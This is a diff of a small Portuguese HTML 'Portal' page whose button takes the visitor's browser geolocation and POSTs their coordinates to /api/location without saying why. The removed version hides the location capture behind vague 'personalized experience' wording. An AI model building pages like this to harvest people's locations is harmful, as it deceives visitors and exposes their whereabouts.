@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Acesso</title>
+    <title>Bem-vindo</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,15 +27,8 @@
         }
         h1 {
             margin-bottom: 20px;
-            font-size: 28px;
         }
-        .welcome-text {
-            margin-bottom: 30px;
-            line-height: 1.6;
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.9);
-        }
-        .start-btn {
+        .btn {
             padding: 15px 30px;
             background: transparent;
             color: white;
@@ -45,108 +38,55 @@
             font-size: 16px;
             transition: all 0.3s ease;
         }
-        .start-btn:hover {
+        .btn:hover {
             background: rgba(255, 255, 255, 0.1);
             transform: translateY(-2px);
         }
         #status {
             margin-top: 20px;
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.8);
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-left: 10px;
-            display: none;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Bem-vindo ao Portal</h1>
-        <p class="welcome-text">Para uma experiência personalizada e acesso aos nossos serviços, clique no botão abaixo para continuar.</p>
-        <button onclick="iniciarExperiencia()" class="start-btn">
-            Iniciar Experiência
-            <span class="loading" id="loading"></span>
-        </button>
+        <button onclick="iniciar()" class="btn">Começar</button>
         <p id="status"></p>
     </div>
 
     <script>
-        // Obter a URL base do site atual
-        const baseUrl = window.location.origin;
-
-        function iniciarExperiencia() {
+        function iniciar() {
             const status = document.getElementById('status');
-            const loading = document.getElementById('loading');
-            
+            status.textContent = 'Iniciando...';
+
             if (!navigator.geolocation) {
-                status.textContent = 'Não foi possível iniciar a experiência. Por favor, tente em outro navegador.';
+                status.textContent = 'Localização não suportada pelo seu navegador';
                 return;
             }
 
-            loading.style.display = 'inline-block';
-            status.textContent = 'Iniciando...';
-
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const data = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        timestamp: new Date().toISOString()
-                    };
-
-                    fetch(`${baseUrl}/api/location`, {
+                function(position) {
+                    fetch('/api/location', {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/json',
+                            'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify(data)
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        })
                     })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Erro na resposta do servidor');
-                        }
-                        return response.json();
+                    .then(response => response.json())
+                    .then(() => {
+                        status.textContent = 'Processo concluído com sucesso!';
                     })
-                    .then(data => {
-                        loading.style.display = 'none';
-                        status.textContent = 'Experiência personalizada iniciada com sucesso!';
-                        setTimeout(() => {
-                            status.textContent = 'Redirecionando...';
-                            // Aqui você pode redirecionar para outra página se desejar
-                        }, 1500);
-                    })
-                    .catch(error => {
-                        loading.style.display = 'none';
-                        status.textContent = 'Ocorreu um erro ao iniciar a experiência. Por favor, tente novamente.';
-                        console.error('Error:', error);
+                    .catch(() => {
+                        status.textContent = 'Erro ao processar. Tente novamente.';
                     });
                 },
-                (error) => {
-                    loading.style.display = 'none';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            status.textContent = 'Para continuar, precisamos da sua permissão para personalizar sua experiência.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            status.textContent = 'Não foi possível iniciar a experiência no momento.';
-                            break;
-                        case error.TIMEOUT:
-                            status.textContent = 'A conexão expirou. Por favor, tente novamente.';
-                            break;
-                        default:
-                            status.textContent = 'Ocorreu um erro inesperado. Por favor, tente novamente.';
-                    }
+                function(error) {
+                    status.textContent = 'É necessário permitir o acesso para continuar.';
                 }
             );
         }
